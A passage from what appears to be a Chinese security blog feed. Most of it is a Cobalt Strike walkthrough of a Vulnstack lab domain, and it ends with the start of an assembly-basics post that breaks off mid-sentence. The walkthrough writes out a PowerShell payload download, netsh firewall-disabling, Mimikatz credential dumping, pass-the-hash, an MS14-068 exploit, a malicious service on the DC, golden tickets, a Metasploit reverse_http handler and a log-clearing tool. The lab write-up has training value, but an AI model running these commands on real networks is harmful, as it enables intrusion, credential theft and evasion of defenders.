class="keyword">object</span> Net.WebClient).DownloadFile(<span class="string">'http://192.168.203.140/a.ps1'</span>,<span class="string">'C:\phpstudy_pro\WWW\a.ps1'</span>)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">推荐可以直接放到C:\\Windows\\Temp\\里面</span><br><span class="line">C:\\Windows\\Temp\\payload.exe</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100401.png" alt="image-20200326210649920"></p><p>运行 直接上线 调整 sleep 1</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100402.png" alt="image-20200326210928665"></p><h1 id="0x01-提权"><a href="#0x01-提权" class="headerlink" title="0x01 提权"></a>0x01 提权</h1><p>权限比较低，需要提权</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100403.png" alt="image-20200326212306328"></p><p>我生成了一个名为<code>Priv Esc</code>的<code>listener</code>（<strong>payload:tcp beacon</strong>）（建议勾选<strong>Bind to localhost only</strong>）</p><p>为什么要勾选呢？作者的话：（反正就是勾选就对了）</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100404.png" alt="image-20200326214136126"></p><h4 id="svc-exe"><a href="#svc-exe" class="headerlink" title="svc-exe"></a>svc-exe</h4><p><code>svc-exe</code>这个参数，并不是和<code>exp</code>提权那样，帮你从普通用户 ”pwn！！“ 一下子拿下系统，而是当管理员权限满足不了你的时候，可以用<code>svc-exe</code>进行提升（类似<code>getsystem</code>命令，但是<code>getsystem</code>不太好使）</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0MDUucG5n?x-oss-process=image/format,png" alt="image-20200326214328389"></p><p>evelate svc-exe</p><p>提权成功</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0MDYucG5n?x-oss-process=image/format,png" alt="image-20200326214552334"></p><h1 id="0x02-横向移动"><a href="#0x02-横向移动" class="headerlink" title="0x02 横向移动"></a>0x02 横向移动</h1><p>切换到高权限用户</p><p>通过 explore-Process List 先查看一下进程，看看有没有杀毒软件</p><p>？？？</p><p>这个靶机怎么可能有？但是流程还是要走一下的</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100407.png" alt="image-20200326223213666"></p><h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><p>使用命令 netsh advfirewall set allprofiles state off 关闭防火墙</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100408.png" alt="image-20200326223531572"></p><h3 id="内网的信息搜集"><a href="#内网的信息搜集" class="headerlink" title="内网的信息搜集"></a>内网的信息搜集</h3><p>网段的端口扫描，得来一下意思意思吧</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100409.png" alt="image-20200328161638642"></p><p>然后查看域的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view &#x2F;domain</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100410.png" alt="image-20200326223828278"></p><p>还可以用cs4的新增命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net domain</span><br><span class="line">net domain_controllers</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100411.png" alt="image-20200327095731157"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">老方法</span><br><span class="line">run net config workstation</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100412.png" alt="image-20200326225030947"></p><p>工作站域是 sun.com</p><p>可现在登录域是 win7</p><p><strong>因此我们需要一个域用户的进程来进行信息搜集</strong></p><h3 id="我们需要一个域用户"><a href="#我们需要一个域用户" class="headerlink" title="我们需要一个域用户"></a>我们需要一个域用户</h3><p>先调用 Logonpasswords 抓一波密码</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100413.png" alt="image-20200326232857399"></p><p>还可以直观的看一下view- credentials</p><p>(因为是靶机，你最好把win7 的账户都登陆一下，否则只能抓到一个账户)</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0MTQucG5n?x-oss-process=image/format,png" alt="image-20200326233306356"></p><p>那我们拿到了这些凭据如何去调用他们呢?</p><p>切换回 本地管理员的beacon上 使用凭证有三种方法</p><ul><li>第一种:使用make_token去调用</li><li>第二种:使用pth命令生成一个新的进程注入进去</li><li>第三种:使用spawn as</li></ul><h3 id="第一种-Make-token"><a href="#第一种-Make-token" class="headerlink" title="第一种:Make_token"></a>第一种:Make_token</h3><p>Make_token是在当前的 beacon 上进行身份伪造<br>在当前beacon上，您的权限、权限或标识没有变化。但是，当您与远程资源交互时，使用的是您<br>伪造的身份.</p><p>先本地测试试命令,这个命令本地用户是用不了的，所以我们make_token一个域用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group “domain admins” &#x2F;domain</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0MTUucG5n?x-oss-process=image/format,png" alt="image-20200327154254921"></p><p>有之前抓取的密码 域用户 leo 123.com</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make_token SUN.COM&#x2F;leo 123.com</span><br><span class="line"></span><br><span class="line">#  注意域是SUN  要写成SUN.COM 才可以</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100416.png" alt="image-20200327155758470"></p><h3 id="第二种-使用pth命令生成一个新的进程注入进去"><a href="#第二种-使用pth命令生成一个新的进程注入进去" class="headerlink" title="第二种:使用pth命令生成一个新的进程注入进去"></a>第二种:使用pth命令生成一个新的进程注入进去</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth SUN.COM\leo NTMLhash</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100417.png" alt="image-20200327162629958"> <img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100418.png" alt="image-20200327163003948"></p><p>找到PID</p><p>然后steal_token PID 成功执行域命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steal_token 3860</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0MTkucG5n?x-oss-process=image/format,png" alt="image-20200327163217871"></p><h3 id="第三种-使用spawn-as"><a href="#第三种-使用spawn-as" class="headerlink" title="第三种:使用spawn as"></a>第三种:使用spawn as</h3><p>spawnas 命令生成具有其他用户凭据的 beacon</p><p>用图形化不香吗？</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0MjAucG5n?x-oss-process=image/format,png" alt="image-20200327163723794"></p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100421.png" alt="image-20200327163840163"> <img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100422.png" alt="image-20200327164306023"></p><p>或者命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawnas SUN.COM&#x2F;leo 123.com</span><br></pre></td></tr></table></figure><h3 id="第四中-进程注入到域用户的进程中，但必须得是-高权用户"><a href="#第四中-进程注入到域用户的进程中，但必须得是-高权用户" class="headerlink" title="第四中 进程注入到域用户的进程中，但必须得是 高权用户"></a>第四中 进程注入到域用户的进程中，但必须得是 高权用户</h3><p>那我使用system权限进入，找到域用户进程</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0MjMucG5n?x-oss-process=image/format,png" alt="image-20200327172102489"></p><p>就会多出来一个用户的beacon，成功</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100424.png" alt="image-20200327172157356"></p><h1 id="0x03-域内信息收集"><a href="#0x03-域内信息收集" class="headerlink" title="0x03 域内信息收集"></a>0x03 域内信息收集</h1><p>有了域用户，那么就可以在域内收集信息</p><p>方法太多了，我只简单的介绍CS里面东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br><span class="line">net view sun</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100425.png" alt="image-20200327172649479"></p><p>查看信任域</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100426.png" alt="image-20200327174110848"></p><p>查看域内计算机</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100427.png" alt="image-20200327175106085"></p><p>查看域控</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net dclist sun</span><br><span class="line"></span><br><span class="line">这是输入sun域就可以，不用 sun.com</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0MjgucG5n?x-oss-process=image/format,png" alt="image-20200327175950669"></p><p>查看域管理员</p><p>Net group \\sun.com domain admin</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100429.png" alt="image-20200327175654595"></p><p>查看所有用户</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100430.png" alt="image-20200327175842362"></p><p>看下sid</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100431.png" alt="image-20200327180720472"></p><p>信息汇总</p><p>域管理员默认没有。。。因为我们还要提权操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">域名：sun.com</span><br><span class="line">域管理员：sun\administrator</span><br><span class="line">域用户：administrator，admin，leo和一个krbtgt</span><br><span class="line">域控：DC</span><br><span class="line">域成员：DC，Win7</span><br><span class="line">域控ip：192.168.138.138</span><br><span class="line">用户sid：S-1-5-21-3388020223-1982701712-4030140183-1110</span><br><span class="line">域sid：S-1-5-21-3388020223-1982701712-4030140183</span><br><span class="line">已知凭据：sun\leo:123.com，win7\heart:123.com</span><br></pre></td></tr></table></figure><h3 id="域提权"><a href="#域提权" class="headerlink" title="域提权"></a>域提权</h3><p>我们利用之前所收集到的信息进行域提权的操作<br>只能上 ms14-068 域提权一波了</p><p>先上传exp</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100432.png" alt="image-20200327214328684"></p><p>生成伪造缓存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell MS14-068.exe -u leo\@sun.com -p 123.com -s S-1-5-21-3388020223-1982701712-4030140183-1110 -d 192.168.138.138</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100433.png" alt="image-20200327214251809"></p><p>此时会生成TGT_leo@sun.com.ccache的伪造缓存文件。</p><p><code>mimikatz kerberos::purge</code> 清空当前机器中所有凭证</p><p><code>mimikatz kerberos::list</code> 查看当前机器凭证</p><p>导入伪造缓存前面</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100434.png" alt="image-20200327214615296"></p><p>用mimikaze</p><p><code>mimikatz kerberos::ptc TGT_leo\@sun.com.ccache</code> 将票据注入到内存中</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100435.png" alt="image-20200327215045968"></p><p>成功提取，读取到了数据</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100436.png" alt="image-20200327215118510"></p><h1 id="0x04横向到域控"><a href="#0x04横向到域控" class="headerlink" title="0x04横向到域控"></a>0x04横向到域控</h1><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100437.png" alt="image-20200327220257321"> <img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100438.png" alt="image-20200327220438029"></p><p>拿下DC</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100439.png" alt="image-20200327221244226"></p><p>反向beacon连接</p><p>先建立一个listener</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100440.png" alt="image-20200327223051295"> <img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100441.png" alt="image-20200327223240172"></p><p>生成一个生成一个 stageless payload ，这里选用的是服务exe</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100442.png" alt="image-20200327223416979"></p><p>选取刚刚的listener</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100443.png" alt="image-20200327223647279"></p><p>生成exe</p><p>我起名叫godc.exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">然后访问</span><br><span class="line">\\DC\\C$</span><br><span class="line"></span><br><span class="line">upload 上传payload</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100444.png" alt="image-20200327223943767"></p><p>加入注册表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">主要这里有个坑</span><br><span class="line">1 是\\ &#x2F; 这俩要分清</span><br><span class="line">2 还有就是 binpath&#x3D; “C:&#x2F;&#x2F;”  这尼玛中间有个空格一定不能省略！！！！</span><br><span class="line">binpath&#x3D;空格“C:&#x2F;&#x2F;”</span><br><span class="line"></span><br><span class="line">run sc \\DC create godc binpath&#x3D; &quot;C:&#x2F;godc.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100445.png" alt="image-20200327225802945"></p><p>启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run sc \\DC start godc</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100446.png" alt="image-20200327231414966"></p><p>机子也是反向链接回来的，注意箭头</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100447.png" alt="image-20200327232435244"></p><p>在内网环境中可以使用ipc $生成的SMB Beacon上传到目标主机执行，但是目标主机并不会直接上线的，需要我们自己用链接命令(link )去连接他。</p><p>link操作 只能是smb beacon</p><p>所以Leo那个是tcp的不能link操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">也要先调用凭据，远程命令执行</span><br><span class="line">关闭防火墙</span><br><span class="line"></span><br><span class="line">remote-exec wmi DC netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><h1 id="0x05-权限维持"><a href="#0x05-权限维持" class="headerlink" title="0x05 权限维持"></a>0x05 权限维持</h1><p>黄金票据(golden ticket)</p><p>1、首先我们需要先利用 logonpasswords 抓一波明文(在名为DC的Beacon进行操作)</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100448.png" alt="image-20200327234654469"></p><p>2、使用 dcsync 命令导出 krbtgt 的NTLM Hash</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100449.png" alt="image-20200327235127313"></p><p>或者，使用 hashdump 也可以导出hash</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100450.png" alt="image-20200328000516193"></p><p>到手</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100451.png" alt="image-20200328000458986"></p><p>3、为了方便于实践黄金票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">找一个低权限的用户 ls \\DC\C$</span><br><span class="line">要进行对比</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0NTIucG5n?x-oss-process=image/format,png" alt="image-20200328124712214"></p><p>制造黄金票据</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0NTMucG5n?x-oss-process=image/format,png" alt="image-20200328122338474"></p><p>可以运行</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100454.png" alt="image-20200328124627029"></p><h3 id="清除票据"><a href="#清除票据" class="headerlink" title="清除票据"></a>清除票据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_purge</span><br></pre></td></tr></table></figure><h1 id="0x06-通道的构建"><a href="#0x06-通道的构建" class="headerlink" title="0x06 通道的构建"></a>0x06 通道的构建</h1><h3 id="会话的派生"><a href="#会话的派生" class="headerlink" title="会话的派生"></a>会话的派生</h3><p>打开msf监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost x.x.x.x</span><br><span class="line">lhost &#x3D;&gt; x.x.x.x</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 6668</span><br><span class="line">lport &#x3D;&gt; 6668</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure><p>msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_http<br>payload =&gt; windows/meterpreter/reverse_http<br>msf5 exploit(multi/handler) &gt; set lhost<br>set lhost 127.0.0.1 set lhost eth0<br>set lhost 172.21.0.4 set lhost fe80::5054:ff:fe89:7f0f%eth0<br>set lhost ::1 set lhost lo<br>msf5 exploit(multi/handler) &gt; set lhost 49.233.129.171<br>lhost =&gt; 49.233.129.171<br>msf5 exploit(multi/handler) &gt; set lport 6668<br>lport =&gt; 6668<br>msf5 exploit(multi/handler) &gt; run</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0NTUucG5n?x-oss-process=image/format,png" alt="image-20200328171237582"></p><h3 id="CS搭建SOCKS代理都说不稳，所以转到MSF上"><a href="#CS搭建SOCKS代理都说不稳，所以转到MSF上" class="headerlink" title="CS搭建SOCKS代理都说不稳，所以转到MSF上"></a><strong>CS搭建SOCKS代理都说不稳，所以转到MSF上</strong></h3><h1 id="0x07清除日志"><a href="#0x07清除日志" class="headerlink" title="0x07清除日志"></a>0x07清除日志</h1><p>推荐脚本用奇安信A-Team写的脚本</p><p>链接：<a href="https://github.com/QAX-A-Team/EventLogMaster" target="_blank" rel="noopener">https://github.com/QAX-A-Team/EventLogMaster</a></p><h1 id="0x08-小结"><a href="#0x08-小结" class="headerlink" title="0x08 小结"></a>0x08 小结</h1><ul><li>思路参考 <strong>记一次在Vulnstack ATT&amp;CK 5 靶场中使用CobaltStrike的渗透之旅</strong></li><li>文章中如有错误的地方望大佬指正。</li><li>菜鸡文章望大佬勿喷。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>二进制安全-汇编基础</title>
      <link href="/2020/06/27/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
      <url>/2020/06/27/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="进制的定义"><a href="#进制的定义" class="headerlink" title="进制的定义"></a>进制的定义</h1><p>二进制：由两个符号组成，分别是0 、1</p><p>八进制：由八个符号组成，分别是0、1、2、3、4、5、6、7</p><p>十进制：由十个符号组成，分别是0、1、2、3、4、5、6、7、8、9</p><p>十六进制：由十六个符号组成，分别是0、1、2、3、4、5、6、7、8、9、A、B、C、D、E、F</p><h2 id="度量单位"><a href="#度量单位" class="headerlink" title="度量单位:"></a>度量单位:</h2><p>1byte 字节 = 8 bit 比特 char</p><p>WORD = 2 BYTE = 16 bit short int</p><p>DWORD = 4 BYTE = 32 bit</p><p>QWORD = 8 BYTE = 64 bit</p><p>1kb = 1024 byte = 8192 bit</p><p>1mb = 1024 kb</p><p>1gb = 1024 mb</p><p>1tb = 1024 gb</p><table><thead><tr><th></th><th>有符号</th><th>无符号</th></tr></thead><tbody><tr><td>byte</td><td>-128-127</td><td>0-255</td></tr><tr><td>word</td><td>-32768-32767</td><td>0-65535</td></tr><tr><td>DWORD</td><td></td><td></td></tr><tr><td>qword</td><td></td><td></td></tr></tbody></table><p>16位汇编：实模式，16位处理器内的内部，最多可以处理存储的长度为16位。</p><p>32位汇编：保护模式，32位处理器内的内部，最多可以处理存储的长度为32位。</p><p>64位汇编：保护模式，64位处理器的内部，最多可以处理存储的长度位64位。</p><table><thead><tr><th>位数</th><th>通用寄存器</th><th>扩展</th></tr></thead><tbody><tr><td>16位通用寄存器</td><td>AX、BX、 CX、 DX、 SI、 DI、 BP、 SP</td><td>R8W、R9W、R10W、R11W、R12W、 R13W、R14W、R15W</td></tr><tr><td>32位通用寄存器</td><td>EAX、EBX、ECX、EDX、ESI、EDI、EBP、ESP</td><td>R8D、R9D、R10D、R11D、R12D、 R13D、R14D、R15D</td></tr><tr><td>64位通用寄存器</td><td>RAX、RBX、RCX、RDX、RSI、RDI、RBP、RSP</td><td>R8、R9、R10、R11、R12、 R13、R14、R15</td></tr></tbody></table><h2 id="32位-常用寄存器"><a href="#32位-常用寄存器" class="headerlink" title="32位 常用寄存器"></a>32位 常用寄存器</h2><p>8个通用寄存器</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTAxODEzMDAucG5n?x-oss-process=image/format,png" alt="image-20200510181300829"></p><p>8个通用寄存器：</p><p>EAX 是”累加器”(accumulator)，操作数和结果数据累加器，返回值运算结果一般都存储在这里</p><p>EBX 是”基地址”(base)寄存器, 在内存寻址时存放基地址。</p><p>ECX 是计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。</p><p>EDX 是（destination） 用于存储部分乘法结果和部分除法被除数</p><p>edi 目标索引寄存器（destination index）: 字符串操作的目标指针，ES段的数据指针</p><p>esi 源索引寄存器（source index）：字符串操作的源指针，SS段的数据指针</p><p>ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向<br>系统栈最上面一个栈帧的栈顶。<br>EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向<br>系统栈最上面一个栈帧的底部</p><p>其中一部分还可以拆开处理</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTAxODIxNDIucG5n?x-oss-process=image/format,png" alt="image-20200510182142575"></p><p>EIP：指令寄存器(Extended Instruction Pointer)，其内存放着一个指针，该指针永远指向下<br>一条等待执行的指令地址</p><p>可以说如果控制了 EIP 寄存器的内容，就控制了进程——我们让 EIP 指向哪里，CPU 就会<br>去执行哪里的指令</p><p>XMM寄存器：（浮点寄存器）</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTAxODIyNTMucG5n?x-oss-process=image/format,png" alt="image-20200510182253226"></p><p>EFLAGS寄存：包含了独立的二进制位，用于控制CPU操作，或是反应一些CPU操作的结果。有些指令可以测试和控制这些单独的处理器标识位。</p><p>EFLAGS寄存器的状态标志(0、2、4、6、7以及11位)指示算术指令（如ADD, SUB, MUL以及DIV指令）的结果，这些状态标志的作用如下：</p><h2 id="内部数据类型"><a href="#内部数据类型" class="headerlink" title="内部数据类型"></a>内部数据类型</h2><p>整数</p><ul><li>BYTE 8位</li><li>SBYTE 8位 有符号</li><li>WORD 16位 符号</li><li>SWORD 16位 有符号</li><li>DWORD 32位 符号</li><li>SDWORD 32位 有符号</li><li>FWORD 48位 保护模式的远指针</li><li>QWORD 64位 整数</li><li>TBYTE 80位 整数</li></ul><p>实数</p><ul><li>REAL4 32位 短实数</li><li>REAL8 64位 长实数</li><li>REAL10 80位 扩展实数</li></ul><p>伪指令</p><ul><li>db 8位整数 =char 可以保持ascll码</li><li>dw 16位整数</li><li>dd 32位整数</li></ul><h2 id="大端序和小端序"><a href="#大端序和小端序" class="headerlink" title="大端序和小端序"></a>大端序和小端序</h2><p>首先还是先看下基本概念：</p><p>1、大端模式：高字节保存在内存的低地址</p><p>2、小端模式：高字节保存在内存的高地址</p><p>mov arr,01234567h</p><p>存储</p><p>大端序：01 23 45 67</p><p>小端序：67 45 23 01</p><h2 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h2><h3 id="算数运算"><a href="#算数运算" class="headerlink" title="算数运算"></a>算数运算</h3><h4 id="加"><a href="#加" class="headerlink" title="加"></a>加</h4><p>格式：ADD OPRD1,OPRD2</p><p>功能：两数相加</p><p>加法指令运算的结果对CF、SF、OF、PF、ZF、AF都会有影响</p><p>不允许OPRD1与OPRD2同时为存储器</p><p>————————————————————————————————</p><p>带进位加法指令ADC</p><p>格式：ADC OPRD1,OPRD2</p><p>功能：OPRD1 = OPRD1 + OPRD2 + CF</p><h4 id="减"><a href="#减" class="headerlink" title="减"></a>减</h4><p>减法指令SUB<br>格式：SUB OPRD1,OPRD2</p><p>功能：两个操作数的相减，即从OPRD1减去OPRD2，其结果放在OPRD1中，指令的类型及标识位的影响与ADD指令相同，注意立即数不能用于目的操作数，两个存储器操作数之间不能直接相减，操作数可为8位或16位的无符号数或符号数</p><p>————————————————————————————————</p><p>带错位减法指令SBB</p><p>格式：SBB OPRD1,OPRD2</p><p>功能：进行两个操作数的相减再减去CF进位标志位，即从OPRD1 = OPRD1 - OPRD2 - CF,其结果放在OPRD1中</p><h4 id="乘"><a href="#乘" class="headerlink" title="乘"></a>乘</h4><p>无符号数指令MUL</p><p>格式：MUL OPRD</p><p>两个相乘数，要么都是8位，要么都是16位。 8位乘法，16位乘法。</p><p>如果是8位，一个数字默认存放在al中，另外一个数字存放在其他8位寄存器中或者字节型内存单元中。</p><p>mul 8位寄存器 ;结果存放在ax中</p><p>如果是16位，一个数字默认存放在ax中，另外一个数字存放在其他16位寄存器中或者字型内存单元中。</p><p>mul 16位寄存器 ;结果存放在dx, ax中</p><p>8位乘法,得到一个16位数， 结果存放在ax中</p><p>16位乘法，得到一个32位数， 低16位存放在ax中，高16位存放在dx中————————————————————————————————<br>带符号数指令IMUL</p><p>功能：乘法操作</p><p>OPRD为通用寄存器或存储器操作数</p><p>本指令会影响标志位CF及OF</p><h4 id="除"><a href="#除" class="headerlink" title="除"></a>除</h4><p>无符号数除法指令DIV</p><p>格式：DIV 